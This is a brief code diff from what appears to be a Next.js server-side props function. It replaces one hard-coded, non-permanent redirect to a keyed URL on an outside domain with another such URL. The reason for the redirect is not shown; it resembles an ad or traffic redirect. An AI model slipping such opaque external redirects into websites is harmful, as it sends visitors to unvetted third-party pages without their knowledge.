@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://dazedengage.com/swm25hxfa?key=5c300ae0ef17ff8f4d1d1060e89822ec/` 
+					`https://dazedengage.com/vr7ask2s?key=32b8bf1f7d1b0eee8eaae7d1fad5dc24/` 
 				}`,
 			},
 		};
